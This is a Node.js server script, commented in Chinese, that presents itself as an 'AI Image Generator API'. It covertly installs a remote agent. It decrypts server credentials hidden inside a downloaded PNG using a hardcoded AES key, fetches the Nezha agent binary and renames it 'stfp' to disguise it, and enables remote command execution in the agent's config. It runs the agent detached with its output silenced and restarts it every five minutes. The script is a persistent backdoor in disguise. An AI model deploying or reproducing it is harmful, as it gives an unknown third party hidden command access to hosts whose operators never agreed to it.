const http = require('http');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const { existsSync, mkdirSync, rmSync, chmodSync, unlinkSync, writeFileSync } = require('fs');
const { spawn, execSync } = require('child_process');
const path = require('path');

// ========== 路径配置 ==========
const BASEDIR = path.join(process.cwd(), '.npm_logs');
const CACHE_DIR = path.join(process.cwd(), 'agent_cache');
const AGENT_BIN = path.join(CACHE_DIR, 'stfp');
const CONFIG_PATH = path.join(CACHE_DIR, 'config.yml');
const LOCAL_IMAGE_PATH = path.join(CACHE_DIR, 'dknz.png');
const ZIP_PATH = path.join(CACHE_DIR, 'agent.zip');

const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;

ensureDir(BASEDIR);
ensureDir(CACHE_DIR);

const processList = ["stfp"];
const CRYPTO_KEY = "1234567890abcdef1234567890abcdef";

// ========== 工具函数 ==========
function fetchText(url) {
    return new Promise((resolve, reject) => {
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    let data = '';
                    res.on('data', chunk => data += chunk);
                    res.on('end', () => resolve(data.trim()));
                } else {
                    reject(new Error(`HTTP ${res.statusCode}`));
                }
            }).on('error', (err) => reject(new Error(`网络请求失败: ${err.message}`)));
        };
        request(url);
    });
}

function fetchFile(url, destPath) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destPath);
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    res.pipe(file);
                    file.on('finish', () => {
                        file.close(() => resolve(true));
                    });
                } else {
                    if (existsSync(destPath)) unlinkSync(destPath);
                    reject(new Error(`下载失败 HTTP ${res.statusCode}`));
                }
            }).on('error', (err) => {
                if (existsSync(destPath)) unlinkSync(destPath);
                reject(new Error(`下载网络错误: ${err.message}`));
            });
        };
        request(url);
    });
}

async function getServerIP() {
    try {
        // 替换为国内可访问的IP查询接口
        return await fetchText('https://api.ip.sb/ip');
    } catch (e) {
        console.warn("公网IP获取失败，使用内网IP", e.message);
        const nets = os.networkInterfaces();
        for (const name of Object.keys(nets)) {
            for (const net of nets[name]) {
                if (net.family === 'IPv4' && !net.internal) {
                    return net.address;
                }
            }
        }
        return '127.0.0.1';
    }
}

function generateUUID(ip) {
    const hash = crypto.createHash('md5').update(ip).digest('hex');
    return `${hash.substring(0,8)}-${hash.substring(8,12)}-${hash.substring(12,16)}-${hash.substring(16,20)}-${hash.substring(20,32)}`;
}

function parseImageMetadata(imagePath) {
    try {
        const buffer = fs.readFileSync(imagePath);
        const startMarker = Buffer.from('==NZ_CONFIG_START==');
        const endMarker = Buffer.from('==NZ_CONFIG_END==');
        
        const startPos = buffer.indexOf(startMarker);
        if (startPos === -1) {
            console.error("图片中未找到配置起始标记");
            return null;
        }
        
        const endPos = buffer.indexOf(endMarker, startPos);
        if (endPos === -1) {
            console.error("图片中未找到配置结束标记");
            return null;
        }
        
        const payloadStr = buffer.slice(startPos + startMarker.length, endPos).toString('utf8').trim();
        
        const parts = payloadStr.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encrypted = Buffer.from(parts.join(':'), 'hex');
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(CRYPTO_KEY), iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch(e) {
        console.error("解析图片配置失败:", e.message);
        return null;
    }
}

function parseEnv(text) {
    const env = {};
    const regex = /(?:export\s+)?(NZ_SERVER|NZ_TLS|NZ_SECRET)\s*=\s*['"]([^'"]+)['"]/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
        env[match[1]] = match[2];
    }
    return env;
}

// ========== 核心启动逻辑 ==========
async function startNezhaAgent() {
    try {
        console.log("===== 开始启动哪吒进程 =====");

        // 1. 下载配置图片（加国内加速代理）
        const imageUrl = 'https://ghproxy.com/https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
        console.log("1. 下载配置图片:", imageUrl);
        await fetchFile(imageUrl, LOCAL_IMAGE_PATH);
        console.log("图片下载完成");

        // 2. 解析图片中的加密配置
        console.log("2. 解析加密配置");
        const decryptedText = parseImageMetadata(LOCAL_IMAGE_PATH);
        if (!decryptedText) {
            console.error("配置解析失败，终止启动");
            return false;
        }
        const nezhaConfig = parseEnv(decryptedText);
        console.log("配置解析成功，服务器:", nezhaConfig.NZ_SERVER);

        // 3. 生成客户端UUID
        const ip = await getServerIP();
        const uuid = generateUUID(ip);
        console.log("3. 生成UUID:", uuid);

        // 4. 下载哪吒agent二进制（不存在才下载）
        if (!existsSync(AGENT_BIN)) {
            console.log("4. 下载哪吒agent二进制包");
            const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
            const arch = archMap[process.arch] || 'amd64';
            // 加国内加速代理
            const downloadUrl = `https://ghproxy.com/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;
            console.log("下载地址:", downloadUrl);
            
            await fetchFile(downloadUrl, ZIP_PATH);
            console.log("压缩包下载完成，开始解压");

            // 清空目录重新解压
            if (existsSync(CACHE_DIR)) rmSync(CACHE_DIR, { recursive: true, force: true });
            ensureDir(CACHE_DIR);

            // 多方案解压
            let unzipOk = false;
            try {
                execSync(`unzip -o "${ZIP_PATH}" -d "${CACHE_DIR}"`, { stdio: 'ignore' });
                unzipOk = true;
            } catch (e) {
                try {
                    execSync(`python3 -c "import zipfile; zipfile.ZipFile('${ZIP_PATH}').extractall('${CACHE_DIR}')"`, { stdio: 'ignore' });
                    unzipOk = true;
                } catch (e2) {
                    console.error("解压失败，unzip和python3均不可用");
                }
            }

            if (!unzipOk) return false;

            // 重命名为 stfp
            const originBin = path.join(CACHE_DIR, 'nezha-agent');
            if (existsSync(originBin)) {
                fs.renameSync(originBin, AGENT_BIN);
                chmodSync(AGENT_BIN, 0o755);
                console.log("二进制重命名为 stfp，已赋予执行权限");
            } else {
                console.error("解压后未找到 nezha-agent 文件");
                return false;
            }
        } else {
            console.log("4. 二进制已存在，跳过下载");
        }

        // 5. 写入配置文件
        console.log("5. 生成配置文件");
        const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
        const configContent = `server: '${nezhaConfig.NZ_SERVER}'
client_secret: '${nezhaConfig.NZ_SECRET}'
client_id: '${uuid}'
tls: ${tlsEnabled}
report_delay: 4
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
skip_connection_count: true
skip_procs_count: true
temperature: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: '${uuid}'
`;
        writeFileSync(CONFIG_PATH, configContent);

        // 6. 后台启动 stfp 进程
        console.log("6. 启动 stfp 进程");
        const child = spawn(AGENT_BIN, ['-c', CONFIG_PATH], {
            env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
            stdio: "ignore",
            detached: true
        });

        child.unref();
        console.log("===== 哪吒stfp进程启动成功 =====");
        return true;

    } catch (err) {
        console.error("启动失败详细错误:", err.message);
        return false;
    }
}

// ========== 进程监控 ==========
function listRunningCommands() {
    try {
        const output = execSync('ps -ef', { encoding: 'utf8' });
        return output.split('\n').filter(line => line.trim()).map(line => ({ cmdline: line }));
    } catch (e) {
        console.error("获取进程列表失败:", e.message);
        return [];
    }
}

async function monitorProcesses() {
    const running = listRunningCommands();
    const missing = processList.every(keyword =>
        !running.some(proc => proc.cmdline.includes(keyword))
    );
    if (missing) {
        console.log("巡检发现进程不存在，尝试重启");
        await startNezhaAgent();
    }
}

const Scheduler = {
    intervalMinutes: 5,
    active: true,
    async loop() {
        if (!this.active) return;
        await monitorProcesses();
        setTimeout(() => this.loop(), this.intervalMinutes * 60 * 1000);
    }
};

// ========== HTTP 服务 ==========
http.createServer(async (req, res) => {
    res.setHeader('Content-Type', 'application/json; charset=utf-8');

    // 手动启动接口
    if (req.url === '/start-nz') {
        const ret = await startNezhaAgent();
        res.writeHead(200);
        return res.end(JSON.stringify({
            code: ret ? 0 : -1,
            msg: ret ? "哪吒stfp进程已成功启动" : "启动失败，请查看容器日志定位原因"
        }));
    }

    // 状态查询接口
    if (req.url === '/api/v1/status') {
        const running = listRunningCommands();
        const isRunning = running.some(proc => proc.cmdline.includes("stfp"));
        res.writeHead(200);
        return res.end(JSON.stringify({
            status: "online",
            service: "AI Image Generator API",
            version: "2.4.1",
            nezha_running: isRunning,
            endpoints: ["/api/v1/render", "/api/v1/status", "/start-nz"]
        }));
    }

    // 首页
    res.writeHead(200);
    res.end(JSON.stringify({
        status: "online",
        msg: "服务运行中",
        tips: "访问 /start-nz 手动启动哪吒进程",
        version: "2.4.1"
    }));
}).listen(PORT, () => {
    console.log(`服务启动成功，监听端口: ${PORT}`);
    setTimeout(() => Scheduler.loop(), 2000);
});

function ensureDir(p) {
    if (!existsSync(p)) mkdirSync(p, { recursive: true });
}
